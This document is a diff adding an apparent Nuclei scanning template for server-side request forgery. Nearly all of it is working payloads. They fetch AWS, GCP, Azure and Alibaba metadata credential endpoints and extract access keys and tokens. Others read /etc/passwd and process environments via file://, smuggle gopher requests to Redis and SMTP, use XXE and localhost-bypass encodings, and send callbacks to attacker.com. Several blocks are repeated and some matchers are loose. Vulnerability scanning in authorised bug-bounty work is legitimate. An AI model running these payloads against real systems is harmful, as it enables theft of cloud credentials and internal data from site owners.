@@ -1,0 +1,889 @@
+id: bug-bounty-ssrf-ultimate
+
+info:
+  name: Ultimate SSRF Detection - Bug Bounty Arsenal
+  author: ezrec
+  severity: high
+  description: |
+    Ultimate SSRF detection with advanced payloads from HackerOne reports, GitHub research,
+    and real-world bug bounty findings. Includes cloud metadata, internal services, 
+    protocol smuggling, and WAF bypass techniques.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
+    cvss-score: 8.6
+    cwe-id: CWE-918
+  tags: ssrf,bug-bounty,server-side-request-forgery,cloud-metadata,internal-services
+
+http:
+  # === AWS METADATA SERVICE (IMDSv1 & IMDSv2) ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/redirect?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/get?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/load?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/download?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/curl?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/wget?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/request?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+      
+      # AWS IMDSv2 (Token-based)
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/api/token"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/api/token"
+      
+      # AWS sensitive endpoints
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/user-data"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/dynamic/instance-identity/document"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "local-ipv4"
+          - "public-hostname"
+          - "public-ipv4"
+          - "security-groups"
+          - "iam/security-credentials"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "Token"
+          - "accountId"
+          - "region"
+          - "availabilityZone"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: aws_metadata
+        regex:
+          - 'ami-[a-z0-9]+'
+          - 'i-[a-z0-9]+'
+          - 'ip-[0-9-]+'
+          - 'AKIA[0-9A-Z]{16}'
+          - '"AccessKeyId"\s*:\s*"([^"]+)"'
+          - '"SecretAccessKey"\s*:\s*"([^"]+)"'
+
+  # === GOOGLE CLOUD METADATA ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/redirect?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/"
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/project/"
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
+      
+      # Alternative GCP endpoints
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/computeMetadata/v1/"
+      - "{{BaseURL}}/proxy?url=http://metadata/computeMetadata/v1/"
+
+    headers:
+      Metadata-Flavor: Google
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "project/"
+          - "instance/"
+          - "service-accounts/"
+          - "attributes/"
+          - "hostname"
+          - "machine-type"
+          - "access_token"
+          - "token_type"
+          - "expires_in"
+          - "computeMetadata"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: gcp_metadata
+        regex:
+          - 'project/([^/\n]+)'
+          - 'instance/([^/\n]+)'
+          - '"access_token":\s*"([^"]+)"'
+
+  # === AZURE METADATA SERVICE ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/instance"
+      - "{{BaseURL}}/redirect?url=http://169.254.169.254/metadata/instance"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/metadata/instance"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
+
+    headers:
+      Metadata: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "compute"
+          - "network"
+          - "instance"
+          - "subscriptionId"
+          - "resourceGroupName"
+          - "vmId"
+          - "location"
+          - "access_token"
+          - "token_type"
+          - "expires_in"
+          - "azureEnvironment"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: azure_metadata
+        regex:
+          - 'subscriptionId.*([a-f0-9-]+)'
+          - 'vmId.*([a-f0-9-]+)'
+          - '"access_token":\s*"([^"]+)"'
+
+  # === ALIBABA CLOUD METADATA ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://100.100.100.200/latest/meta-data/"
+      - "{{BaseURL}}/fetch?url=http://100.100.100.200/latest/meta-data/"
+      - "{{BaseURL}}/proxy?url=http://100.100.100.200/latest/meta-data/instance-id"
+      - "{{BaseURL}}/proxy?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "instance-id"
+          - "image-id"
+          - "region-id"
+          - "zone-id"
+          - "AccessKeyId"
+          - "AccessKeySecret"
+          - "SecurityToken"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: alibaba_metadata
+        regex:
+          - '"AccessKeyId":\s*"([^"]+)"'
+          - '"AccessKeySecret":\s*"([^"]+)"'
+
+  # === INTERNAL NETWORK SERVICES ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://localhost:22"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:22"
+      - "{{BaseURL}}/proxy?url=http://localhost:3306"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:3306"
+      - "{{BaseURL}}/proxy?url=http://localhost:5432"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:5432"
+      - "{{BaseURL}}/proxy?url=http://localhost:6379"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:6379"
+      - "{{BaseURL}}/proxy?url=http://localhost:27017"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:27017"
+      - "{{BaseURL}}/proxy?url=http://localhost:9200"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:9200"
+      - "{{BaseURL}}/proxy?url=http://localhost:8080"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:8080"
+      - "{{BaseURL}}/proxy?url=http://localhost:8000"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:8000"
+      - "{{BaseURL}}/proxy?url=http://localhost:3000"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:3000"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "SSH"
+          - "OpenSSH"
+          - "mysql"
+          - "PostgreSQL"
+          - "redis"
+          - "MongoDB"
+          - "elasticsearch"
+          - "connection"
+          - "protocol"
+          - "version"
+          - "server"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: internal_service
+        regex:
+          - 'SSH.*([0-9.]+)'
+          - 'OpenSSH.*([0-9.]+)'
+          - 'mysql.*([0-9.]+)'
+          - 'PostgreSQL.*([0-9.]+)'
+          - 'redis_version:([0-9.]+)'
+
+  # === LOCALHOST VARIATIONS & BYPASSES ===
+  - method: GET
+    path:
+      # IP variations
+      - "{{BaseURL}}/proxy?url=http://0.0.0.0:80"
+      - "{{BaseURL}}/proxy?url=http://0:80"
+      - "{{BaseURL}}/proxy?url=http://127.1:80"
+      - "{{BaseURL}}/proxy?url=http://127.0.1:80"
+      - "{{BaseURL}}/proxy?url=http://2130706433:80"
+      - "{{BaseURL}}/proxy?url=http://017700000001:80"
+      - "{{BaseURL}}/proxy?url=http://0x7f000001:80"
+      
+      # Domain variations
+      - "{{BaseURL}}/proxy?url=http://localtest.me"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1.nip.io"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1.xip.io"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1.sslip.io"
+      - "{{BaseURL}}/proxy?url=http://vcap.me"
+      - "{{BaseURL}}/proxy?url=http://lvh.me"
+      
+      # Unicode bypasses
+      - "{{BaseURL}}/proxy?url=http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ:80"
+      - "{{BaseURL}}/proxy?url=http://localhost。"
+      - "{{BaseURL}}/proxy?url=http://localhost｡"
+      
+      # URL encoding bypasses
+      - "{{BaseURL}}/proxy?url=http://127%2e0%2e0%2e1:80"
+      - "{{BaseURL}}/proxy?url=http://127%252e0%252e0%252e1:80"
+      - "{{BaseURL}}/proxy?url=http://localhost%00:80"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: localhost_bypass
+        regex:
+          - 'localhost|127\.0\.0\.1|localtest\.me'
+
+  # === PROTOCOL SMUGGLING ===
+  - method: GET
+    path:
+      # File protocol
+      - "{{BaseURL}}/proxy?url=file:///etc/passwd"
+      - "{{BaseURL}}/proxy?url=file:///etc/hosts"
+      - "{{BaseURL}}/proxy?url=file:///proc/version"
+      - "{{BaseURL}}/proxy?url=file:///proc/self/environ"
+      - "{{BaseURL}}/proxy?url=file:///proc/self/cmdline"
+      - "{{BaseURL}}/proxy?url=file:///proc/self/cwd"
+      - "{{BaseURL}}/proxy?url=file:///var/log/apache2/access.log"
+      - "{{BaseURL}}/proxy?url=file:///var/log/nginx/access.log"
+      
+      # FTP protocol
+      - "{{BaseURL}}/proxy?url=ftp://127.0.0.1:21"
+      - "{{BaseURL}}/proxy?url=ftp://localhost:21"
+      
+      # Gopher protocol
+      - "{{BaseURL}}/proxy?url=gopher://127.0.0.1:6379/_INFO"
+      - "{{BaseURL}}/proxy?url=gopher://127.0.0.1:3306/"
+      - "{{BaseURL}}/proxy?url=gopher://127.0.0.1:25/_EHLO%20test"
+      - "{{BaseURL}}/proxy?url=gopher://localhost:22/_SSH-2.0"
+      
+      # LDAP protocol
+      - "{{BaseURL}}/proxy?url=ldap://127.0.0.1:389"
+      - "{{BaseURL}}/proxy?url=ldaps://127.0.0.1:636"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "daemon:x:"
+          - "bin:x:"
+          - "sys:x:"
+          - "localhost"
+          - "127.0.0.1"
+          - "Linux version"
+          - "PATH="
+          - "redis_version"
+          - "redis_mode"
+          - "mysql"
+          - "SSH"
+          - "SMTP"
+          - "protocol"
+          - "220"
+          - "250"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: protocol_smuggling
+        regex:
+          - 'root:x:0:0:([^:]+)'
+          - 'Linux version ([0-9.]+)'
+          - 'redis_version:([0-9.]+)'
+          - 'SSH.*([0-9.]+)'
+
+  # === WEBHOOK & CALLBACK SSRF ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/webhook?url=http://attacker.com/callback"
+      - "{{BaseURL}}/callback?url=http://attacker.com/callback"
+      - "{{BaseURL}}/api/webhook?url=http://attacker.com/callback"
+      - "{{BaseURL}}/integration?url=http://attacker.com/callback"
+      - "{{BaseURL}}/notify?url=http://attacker.com/callback"
+      - "{{BaseURL}}/ping?url=http://attacker.com/callback"
+      - "{{BaseURL}}/health?url=http://attacker.com/callback"
+      - "{{BaseURL}}/monitor?url=http://attacker.com/callback"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        name: webhook_ssrf
+        regex:
+          - 'callback|webhook|integration|notify|ping|health|monitor'
+
+  # === IMAGE/MEDIA SSRF ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/image?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/avatar?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/thumbnail?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/preview?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/screenshot?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/resize?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/crop?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/convert?url=http://169.254.169.254/latest/meta-data/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-groups"
+          - "iam/security-credentials"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: image_ssrf
+        regex:
+          - 'ami-[a-z0-9]+'
+          - 'i-[a-z0-9]+'
+
+  # === POST-BASED SSRF ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/support"
+      - "{{BaseURL}}/report"
+      - "{{BaseURL}}/api/fetch"
+      - "{{BaseURL}}/api/proxy"
+      - "{{BaseURL}}/webhook"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      name=test&email=test@test.com&message=test&url=http://169.254.169.254/latest/meta-data/&website=http://169.254.169.254/latest/meta-data/&callback=http://attacker.com/callback&webhook_url=http://169.254.169.254/latest/meta-data/&image_url=http://169.254.169.254/latest/meta-data/&avatar_url=http://169.254.169.254/latest/meta-data/
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-groups"
+          - "metadata"
+          - "iam/security-credentials"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: post_ssrf
+        regex:
+          - 'ami-[a-z0-9]+'
+          - 'i-[a-z0-9]+'
+
+  # === JSON-BASED SSRF ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/fetch"
+      - "{{BaseURL}}/api/proxy"
+      - "{{BaseURL}}/api/request"
+      - "{{BaseURL}}/api/webhook"
+      - "{{BaseURL}}/api/callback"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"url":"http://169.254.169.254/latest/meta-data/","webhook_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.com/callback","image_url":"http://169.254.169.254/latest/meta-data/","target":"http://127.0.0.1:22","endpoint":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-groups"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "SSH"
+          - "OpenSSH"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: json_ssrf
+        regex:
+          - 'ami-[a-z0-9]+'
+          - '"AccessKeyId":\s*"([^"]+)"'
+          - 'SSH.*([0-9.]+)'
+
+  # === XML-BASED SSRF (XXE to SSRF) ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/upload/xml"
+      - "{{BaseURL}}/parse/xml"
+      - "{{BaseURL}}/import/xml"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+      ]>
+      <root>
+      <data>&xxe;</data>
+      </root>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-groups"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: xml_ssrf
+        regex:
+          - 'ami-[a-z0-9]+'
+          - 'i-[a-z0-9]+'
+
+  # === BLIND SSRF DETECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://burpcollaborator.net"
+      - "{{BaseURL}}/fetch?url=http://interact.sh"
+      - "{{BaseURL}}/webhook?url=http://webhook.site"
+      - "{{BaseURL}}/callback?url=http://requestbin.net"
+      - "{{BaseURL}}/ping?url=http://canarytokens.com"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 404
+
+    extractors:
+      - type: regex
+        name: blind_ssrf
+        regex:
+          - 'burpcollaborator|interact\.sh|webhook\.site|requestbin|canarytokens'
+
+  # === DOCKER METADATA ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://172.17.0.1:2375/containers/json"
+      - "{{BaseURL}}/proxy?url=http://172.17.0.1:2376/containers/json"
+      - "{{BaseURL}}/proxy?url=http://unix:/var/run/docker.sock/containers/json"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Id"
+          - "Image"
+          - "Command"
+          - "Created"
+          - "Status"
+          - "Names"
+          - "NetworkMode"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: docker_metadata
+        regex:
+          - '"Id":\s*"([^"]+)"'
+          - '"Image":\s*"([^"]+)"'
+
+  # === KUBERNETES METADATA ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=https://kubernetes.default.svc/api/v1/namespaces/default/pods"
+      - "{{BaseURL}}/proxy?url=http://kubernetes.default.svc/api/v1/namespaces/default/pods"
+      - "{{BaseURL}}/proxy?url=https://10.96.0.1/api/v1/namespaces/default/pods"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 401
+          - 403
+
+      - type: word
+        words:
+          - "kind"
+          - "apiVersion"
+          - "metadata"
+          - "items"
+          - "pods"
+          - "services"
+          - "namespaces"
+          - "Unauthorized"
+          - "Forbidden"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: k8s_metadata
+        regex:
+          - '"kind":\s*"([^"]+)"'
+          - '"apiVersion":\s*"([^"]+)"'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/redirect?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+
+    headers:
+      Metadata-Flavor: Google
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "project/"
+          - "instance/"
+          - "service-accounts/"
+          - "attributes/"
+          - "hostname"
+          - "machine-type"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: gcp_metadata
+        regex:
+          - 'project/([^/\n]+)'
+          - 'instance/([^/\n]+)'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/instance"
+      - "{{BaseURL}}/redirect?url=http://169.254.169.254/metadata/instance"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/metadata/instance"
+
+    headers:
+      Metadata: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "compute"
+          - "network"
+          - "instance"
+          - "subscriptionId"
+          - "resourceGroupName"
+          - "vmId"
+          - "location"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: azure_metadata
+        regex:
+          - 'subscriptionId.*([a-f0-9-]+)'
+          - 'vmId.*([a-f0-9-]+)'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=http://localhost:22"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:22"
+      - "{{BaseURL}}/proxy?url=http://localhost:3306"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:3306"
+      - "{{BaseURL}}/proxy?url=http://localhost:5432"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:5432"
+      - "{{BaseURL}}/proxy?url=http://localhost:6379"
+      - "{{BaseURL}}/proxy?url=http://127.0.0.1:6379"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "SSH"
+          - "OpenSSH"
+          - "mysql"
+          - "PostgreSQL"
+          - "redis"
+          - "MongoDB"
+          - "connection"
+          - "protocol"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: internal_service
+        regex:
+          - 'SSH.*([0-9.]+)'
+          - 'OpenSSH.*([0-9.]+)'
+          - 'mysql.*([0-9.]+)'
+          - 'PostgreSQL.*([0-9.]+)'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/webhook?url=http://attacker.com/callback"
+      - "{{BaseURL}}/callback?url=http://attacker.com/callback"
+      - "{{BaseURL}}/api/webhook?url=http://attacker.com/callback"
+      - "{{BaseURL}}/integration?url=http://attacker.com/callback"
+      - "{{BaseURL}}/notify?url=http://attacker.com/callback"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        name: webhook_ssrf
+        regex:
+          - 'callback|webhook|integration|notify'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/support"
+      - "{{BaseURL}}/report"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      name=test&email=test@test.com&message=test&url=http://169.254.169.254/latest/meta-data/&website=http://169.254.169.254/latest/meta-data/&callback=http://attacker.com/callback
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-groups"
+          - "metadata"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: form_ssrf
+        regex:
+          - 'ami-[a-z0-9]+'
+          - 'i-[a-z0-9]+'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/image?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/avatar?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/thumbnail?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/preview?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/screenshot?url=http://169.254.169.254/latest/meta-data/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "security-groups"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: image_ssrf
+        regex:
+          - 'ami-[a-z0-9]+'
+          - 'i-[a-z0-9]+'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/proxy?url=file:///etc/passwd"
+      - "{{BaseURL}}/proxy?url=file:///etc/hosts"
+      - "{{BaseURL}}/proxy?url=file:///proc/version"
+      - "{{BaseURL}}/proxy?url=file:///proc/self/environ"
+      - "{{BaseURL}}/fetch?url=file:///etc/passwd"
+      - "{{BaseURL}}/load?url=file:///etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "daemon:x:"
+          - "bin:x:"
+          - "sys:x:"
+          - "localhost"
+          - "127.0.0.1"
+          - "Linux version"
+          - "PATH="
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: file_ssrf
+        regex:
+          - 'root:x:0:0:([^:]+)'
+          - 'Linux version ([0-9.]+)'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/redirect?url=gopher://127.0.0.1:6379/_INFO"
+      - "{{BaseURL}}/proxy?url=gopher://127.0.0.1:3306/"
+      - "{{BaseURL}}/fetch?url=gopher://127.0.0.1:25/"
+      - "{{BaseURL}}/load?url=gopher://localhost:22/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "redis_version"
+          - "redis_mode"
+          - "mysql"
+          - "SSH"
+          - "SMTP"
+          - "protocol"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: gopher_ssrf
+        regex:
+          - 'redis_version:([0-9.]+)'
+          - 'SSH.*([0-9.]+)'
